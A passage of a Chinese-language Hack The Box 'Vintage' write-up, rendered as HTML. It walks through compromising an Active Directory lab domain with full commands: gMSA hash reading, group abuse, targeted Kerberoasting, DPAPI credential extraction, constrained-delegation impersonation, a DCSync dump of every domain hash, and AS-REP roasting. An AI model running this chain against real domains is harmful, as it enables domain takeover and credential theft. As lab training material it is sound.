+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">msDS-ManagedPassword.NTLM:</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">msDS-ManagedPassword.B64ENCODED:</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> rbqGzqVFdvxykdQOfIBbURV60BZIq0uuTGQhrt7I1TyP2RA/oEHtUj9GrQGAFahc5XjLHb9RimLD5YXWsF5OiNgZ5SeBM+WrdQIkQPsnm/wZa/GKMx+m6zYXNknGo8teRnCxCinuh22f0Hi6pwpoycKKBWtXin4n8WQXF7gDyGG6l23O9mrmJCFNlGyQ2+75Z1C6DD0jp29nn6WoDq3nhWhv9BdZRkQ7nOkxDU0bFOOKYnSXWMM7SkaXA9S3TQPz86bV9BwYmB/6EfGJd2eHp5wijyIFG4/A+n7iHBfVFcZDN3LhvTKcnnBy5nihhtrMsYh2UMSSN9KEAVQBOAw12g==</span></span></code></pre>
+<p><img alt="image-20241203162155881.png" loading="lazy" decoding="async" width="2085" height="835" src="/_astro/image-20241203162155881.BdurtFwP_Z21bW4s.webp" srcset=""></p>
+<p>GMSA01$ 可以将自己添加到 SERVICEMANAGERS 组中，然后可以完全控制 SVC_ARK、SVC_LDAP、SVC_SQL 三个用户</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">impacket-getTGT</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb/'GMSA01$'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -hashes</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> ':a317f224b45046c1446372c4dc06ae53'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -no-pass</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -dc-ip</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $IP</span></span>
+<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#54B9FF">export</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> KRB5CCNAME</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">=</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">GMSA01</span><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">\$</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">.</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8">ccache</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">bloodyAD</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --host</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> dc01.vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -k</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> add</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> groupMember</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'SERVICEMANAGERS'</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'GMSA01$'</span></span>
+<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">impacket-getTGT</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb/'GMSA01$'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -hashes</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> ':a317f224b45046c1446372c4dc06ae53'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -no-pass</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -dc-ip</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $IP</span></span></code></pre>
+<p><img alt="image-20241203163335258.png" loading="lazy" decoding="async" width="1779" height="150" src="/_astro/image-20241203163335258.DA1OhIu7_28jfyb.webp" srcset=""></p>
+<p>但是这三个用户没啥特殊权限，因此先不要修改密码，先把密码导出一下，</p>
+<p><em>这里第一次把密码改了，后面还好有花师傅指点，不然真迷路了。</em></p>
+<blockquote>
+<p><a href="https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py">https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py</a></p>
+</blockquote>
+<p>现在对 SVC_* 用户有 GenericAll 权限，因此可以先尝试设置一个 SPN，然后再 Kerberoast，这个 py 脚本可以自动操作</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">targetedKerberoast</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --dc-ip</span><span style="--shiki-light:#24292E;--shiki-dark:#4BF3C8"> $IP</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --dc-host</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> dc01.vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -k</span></span></code></pre>
+<p><img alt="image-20241203223244299.png" loading="lazy" decoding="async" width="2107" height="894" src="/_astro/image-20241203223244299.YeJA6zbX_aVcN5.webp" srcset=""></p>
+<p>但是这里很奇怪，只出了两个用户的 TGS，还有 SVC_SQL 的没显示，正常应该是都可以。</p>
+<p><img alt="image-20241203225259105.png" loading="lazy" decoding="async" width="811" height="900" src="/_astro/image-20241203225259105.DXkNp2Z9_ZpwSVM.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#00DAEF">bloodyAD</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> --host</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> dc01.vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> vintage.htb</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -k</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> remove</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> uac</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> 'svc_sql'</span><span style="--shiki-light:#005CC5;--shiki-dark:#FFD493"> -f</span><span style="--shiki-light:#032F62;--shiki-dark:#FFD493"> ACCOUNTDISABLE</span></span></code></pre>
+<p><img alt="image-20241203230121016.png" loading="lazy" decoding="async" width="1536" height="157" src="/_astro/image-20241203230121016.AgCXT-WL_7LAHR.webp" srcset=""></p>
+<p><img alt="image-20241203230128029.png" loading="lazy" decoding="async" width="1996" height="643" src="/_astro/image-20241203230128029.Bm7iTGlJ_Z1BCVor.webp" srcset=""></p>
+<p>这样就可以成功拿到 svc_sql 的 tgs 了，可以把三个放一起跑 <code>hashcat -m 13100</code></p>
+<p><img alt="image-20241203230256415.png" loading="lazy" decoding="async" width="2190" height="505" src="/_astro/image-20241203230256415.MPCC9MFb_1DeWKU.webp" srcset=""></p>
+<p>密码喷射一下</p>
+<p><img alt="image-20241203230416349.png" loading="lazy" decoding="async" width="1381" height="601" src="/_astro/image-20241203230416349.DRuLbmUF_1O7pkd.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>KRB5CCNAME=C.Neri.ccache evil-winrm -i 'dc01.vintage.htb' -r 'vintage.htb'</span></span></code></pre>
+<p><img alt="image-20241203231211751.png" loading="lazy" decoding="async" width="2206" height="960" src="/_astro/image-20241203231211751.CRZR_bCO_1e1wdN.webp" srcset=""></p>
+<h3 id="local-enum">Local Enum</h3>
+<p><img alt="image-20241205102341519.png" loading="lazy" decoding="async" width="2041" height="385" src="/_astro/image-20241205102341519.G-kKrFgK_ZJvS7y.webp" srcset=""></p>
+<p>想跑一下 WinPEAS，但是靶机设置了 AMSI，因为太菜绕不过去，只能手动枚举一下了</p>
+<blockquote>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi</a></p>
+</blockquote>
+<p>…</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">Get-ChildItem</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">force C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">Get-ChildItem</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">force C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\</span></span></code></pre>
+<p><img alt="image-20241205105751998.png" loading="lazy" decoding="async" width="1911" height="649" src="/_astro/image-20241205105751998.BolsPxzx_Z6fsW3.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="powershell"><code><span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">Get-ChildItem</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">force </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">-</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">recurse C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\</span></span>
+<span class="line"><span style="--shiki-light:#005CC5;--shiki-dark:#EEF0F9">Get-ChildItem</span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9"> -</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">force </span><span style="--shiki-light:#D73A49;--shiki-dark:#EEF0F9">-</span><span style="--shiki-light:#24292E;--shiki-dark:#EEF0F9">recurse C:\Users\C.Neri\AppData\Local\Microsoft\Protect\</span></span></code></pre>
+<p><img alt="image-20241205102138493.png" loading="lazy" decoding="async" width="2067" height="1012" src="/_astro/image-20241205102138493.HC88y5Pw_1bWBOB.webp" srcset=""></p>
+<h2 id="shell-as-cneri_adm">Shell as C.Neri_Adm</h2>
+<blockquote>
+<p><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords</a></p>
+</blockquote>
+<p>这里枚举到了 DPAPI，可以根据 hacktricks 进一步测试，这里有 amsi，所以最好把凭据保存到本地</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>[System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847' -Encoding Byte))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b' -Encoding Byte))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6' -Encoding Byte))</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[System.Convert]::ToBase64String((Get-Content -Path 'C:\Users\C.Neri\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D' -Encoding Byte))</span></span></code></pre>
+<p><img alt="image-20241205104022305.png" loading="lazy" decoding="async" width="2514" height="585" src="/_astro/image-20241205104022305.RE36emUo_1zFrhD.webp" srcset=""></p>
+<p><img alt="image-20241205105927361.png" loading="lazy" decoding="async" width="2491" height="823" src="/_astro/image-20241205105927361.BwUSk2Q7_Z2tqAnN.webp" srcset=""></p>
+<p>因为有 amsi，用 evil-winrm download 老是出错，所以使用 base64 传输，开始解密</p>
+<p><img alt="image-20241205110643646.png" loading="lazy" decoding="async" width="2515" height="1054" src="/_astro/image-20241205110643646.cmt9NnXA_27hGk.webp" srcset=""></p>
+<p><img alt="image-20241205110806383.png" loading="lazy" decoding="async" width="2208" height="1131" src="/_astro/image-20241205110806383.5CgLmQec_Z10Unog.webp" srcset=""></p>
+<p>可以看到这个路径 <code>C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b</code> 的 Key 是正确的，解密得到了新的用户凭据 <code>vintage\C.Neri_Adm:Uncr4ck4bl3P4ssW0rd0312</code> 验证一下</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>impacket-getTGT vintage.htb/'C.Neri_Adm:Uncr4ck4bl3P4ssW0rd0312' -dc-ip $IP</span></span></code></pre>
+<p><img alt="image-20241205111454023.png" loading="lazy" decoding="async" width="1305" height="186" src="/_astro/image-20241205111454023.Btsny8rq_Zj0SQq.webp" srcset=""></p>
+<h2 id="shell-as-administrator">Shell as Administrator</h2>
+<p><img alt="image-20241205113329251.png" loading="lazy" decoding="async" width="1693" height="541" src="/_astro/image-20241205113329251.BEt9BnRX_1ABlr6.webp" srcset=""></p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>bloodyAD --host dc01.vintage.htb -d vintage.htb -k add groupMember 'DELEGATEDADMINS' 'C.Neri_Adm'</span></span></code></pre>
+<p><img alt="image-20241205142917912.png" loading="lazy" decoding="async" width="1642" height="631" src="/_astro/image-20241205142917912.DA9txgu__1CbsYO.webp" srcset=""></p>
+<p>这里添加 C.Neri_Adm 失败，是因为 C.Neri_Adm 已经在组里面了</p>
+<p><img alt="image-20241205232654174.png" loading="lazy" decoding="async" width="1309" height="676" src="/_astro/image-20241205232654174.jCt1z5XB_Z27C5s0.webp" srcset=""></p>
+<p><img alt="image-20241205232838967.png" loading="lazy" decoding="async" width="1155" height="864" src="/_astro/image-20241205232838967.BSqWPraZ_ZDPnSW.webp" srcset=""></p>
+<p>这里的 KCD 需要两个条件：</p>
+<ol>
+<li>
+<p>至少有一个 SPN，或者 sAMAccountName 以 $ 结尾</p>
+</li>
+<li>
+<p>有 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性（加入到 DELEGATEDADMINS 组）</p>
+</li>
+</ol>
+<p>这里 C.Neri_Adm 不能给自己加 SPN，所以需要换一个有权限控制的账户，前面出现 SVC_* 账户都可以控制，这里以 SVC_ARK 操作</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span># 0. 重启环境后发现不做这些不行</span></span>
+<span class="line"><span>impacket-getTGT vintage.htb/'FS01$':fs01 -dc-ip $IP</span></span>
+<span class="line"><span>KRB5CCNAME=FS01\$.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k get object 'GMSA01$' --attr msDS-ManagedPassword</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 1. 获取 GMSA01$ 服务的票据，把自己添加到 SERVICEMANAGER 组中，然后重新获取票据</span></span>
+<span class="line"><span>impacket-getTGT vintage.htb/'GMSA01$' -hashes ':a317f224b45046c1446372c4dc06ae53' -no-pass -dc-ip $IP</span></span>
+<span class="line"><span>KRB5CCNAME=GMSA01\$.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k add groupMember 'SERVICEMANAGERS' 'GMSA01$'</span></span>
+<span class="line"><span>impacket-getTGT vintage.htb/'GMSA01$' -hashes ':a317f224b45046c1446372c4dc06ae53' -no-pass -dc-ip $IP</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 2. 使用 GMSA01$ 修改 SVC_Ark 的密码并添加 SPN，然后获取票据</span></span>
+<span class="line"><span>KRB5CCNAME=GMSA01\$.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k set password 'SVC_Ark' 'Admin@123'</span></span>
+<span class="line"><span>KRB5CCNAME=GMSA01\$.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k set object "SVC_Ark" servicePrincipalName -v "Fuck/You"</span></span>
+<span class="line"><span>impacket-getTGT 'vintage.htb/SVC_Ark:Admin@123' -dc-ip $IP</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 3. 获取 C.Neri_Adm 票据，把 SVC_ARK 添加到 DELEGATEDADMINS 组</span></span>
+<span class="line"><span>impacket-getTGT vintage.htb/'C.Neri_Adm:Uncr4ck4bl3P4ssW0rd0312' -dc-ip $IP</span></span>
+<span class="line"><span>KRB5CCNAME=C.Neri_Adm.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k add groupMember 'DELEGATEDADMINS' 'SVC_Ark'</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 4. KCD SVC_Ark 到 L.BIANCHI_ADM。L.BIANCHI_ADM 是另一个域管，Adm DCSync 会失败</span></span>
+<span class="line"><span>impacket-getTGT 'vintage.htb/SVC_Ark:Admin@123' -dc-ip $IP</span></span>
+<span class="line"><span>KRB5CCNAME=SVC_Ark.ccache impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate 'L.BIANCHI_ADM' 'vintage.htb/SVC_Ark:Admin@123' -dc-ip $IP -k</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># 5. Dump Hash</span></span>
+<span class="line"><span>KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache impacket-secretsdump 'vintage.htb/L.BIANCHI_ADM@dc01.vintage.htb' -dc-ip $IP -k -no-pass -just-dc-ntlm</span></span></code></pre>
+<p><img alt="image-20241206002528263.png" loading="lazy" decoding="async" width="2464" height="675" src="/_astro/image-20241206002528263.Dh6w7YzF_ZlYyiS.webp" srcset=""></p>
+<p>成功获取到 L.BIANCHI_ADM 的票据，拿去 DCSync</p>
+<p><img alt="image-20241206002438333.png" loading="lazy" decoding="async" width="1963" height="819" src="/_astro/image-20241206002438333.2qFA5VWo_5jLdT.webp" srcset=""></p>
+<p><img alt="image-20241206002137293.png" loading="lazy" decoding="async" width="2262" height="1044" src="/_astro/image-20241206002137293.BeG6KOVi_Z1j7JVb.webp" srcset=""></p>
+<h2 id="more">More</h2>
+<h3 id="dump-hash">Dump Hash</h3>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span>impacket-getTGT vintage.htb/L.Bianchi_adm -hashes ':75d93b5d1c67135a2c2f4979fb8d076f' -no-pass -dc-ip $IP</span></span>
+<span class="line"><span>KRB5CCNAME=L.Bianchi_adm.ccache impacket-secretsdump 'vintage.htb/L.BIANCHI_ADM@dc01.vintage.htb' -dc-ip $IP -k -no-pass -just-dc-ntlm</span></span>
+<span class="line"><span>Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span></span>
+<span class="line"><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets</span></span>
+<span class="line"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:468c7497513f8243b59980f2240a10de:::</span></span>
+<span class="line"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span></span>
+<span class="line"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:be3d376d906753c7373b15ac460724d8:::</span></span>
+<span class="line"><span>M.Rossi:1111:aad3b435b51404eeaad3b435b51404ee:8e5fc7685b7ae019a516c2515bbd310d:::</span></span>
+<span class="line"><span>R.Verdi:1112:aad3b435b51404eeaad3b435b51404ee:42232fb11274c292ed84dcbcc200db57:::</span></span>
+<span class="line"><span>L.Bianchi:1113:aad3b435b51404eeaad3b435b51404ee:de9f0e05b3eaa440b2842b8fe3449545:::</span></span>
+<span class="line"><span>G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::</span></span>
+<span class="line"><span>C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::</span></span>
+<span class="line"><span>P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::</span></span>
+<span class="line"><span>svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::</span></span>
+<span class="line"><span>svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:458fd9b330df2eff17c42198627169aa:::</span></span>
+<span class="line"><span>svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::</span></span>
+<span class="line"><span>C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::</span></span>
+<span class="line"><span>L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:75d93b5d1c67135a2c2f4979fb8d076f:::</span></span>
+<span class="line"><span>DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::</span></span>
+<span class="line"><span>gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53:::</span></span>
+<span class="line"><span>FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::</span></span>
+<span class="line"><span>[*] Cleaning up...</span></span></code></pre>
+<h3 id="svc_-hash">SVC_* Hash</h3>
+<p>前面使用的是 Kerberoasting 获取的 TGS Hash，这里也可以通过关闭预认证，来获取 AS-REP Hash</p>
+<pre class="astro-code astro-code-themes github-light houston" style="--shiki-light:#24292e;--shiki-dark:#eef0f9;--shiki-light-bg:#fff;--shiki-dark-bg:#17191e; overflow-x: auto;" tabindex="0" data-language="text"><code><span class="line"><span># 1. 启用 SVC_SQL</span></span>
+<span class="line"><span>KRB5CCNAME=GMSA01\$.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k remove uac 'svc_sql' -f ACCOUNTDISABLE</span></span>
+<span class="line"><span># 2. 关闭预认证</span></span>
+<span class="line"><span>KRB5CCNAME=GMSA01\$.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k add uac SVC_Ark -f DONT_REQ_PREAUTH</span></span>
+<span class="line"><span>KRB5CCNAME=GMSA01\$.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k add uac SVC_SQL -f DONT_REQ_PREAUTH</span></span>
+<span class="line"><span>KRB5CCNAME=GMSA01\$.ccache bloodyAD --host dc01.vintage.htb -d vintage.htb -k add uac SVC_LDAP -f DONT_REQ_PREAUTH</span></span>
+<span class="line"><span># 3. GetNPU</span></span>
+<span class="line"><span>impacket-GetNPUsers vintage.htb/ -usersfile info/user_svc.list -request</span></span></code></pre>
+<p><img alt="image-20241206094402216.png" loading="lazy" decoding="async" width="1974" height="1120" src="/_astro/image-20241206094402216.D_v2CXOJ_23qkB9.webp" srcset=""></p>
+<p>可以拿到三个用户的 AS-REP Hash</p>
+</div></article></main><footer data-astro-cid-jo6i4kqk><div class="inner" data-astro-cid-jo6i4kqk><p class="line" data-astro-cid-jo6i4kqk>© 2026 Zumpyx</p><p class="note" data-astro-cid-jo6i4kqk>notes · exploit · write · repeat</p></div></footer></body></html>
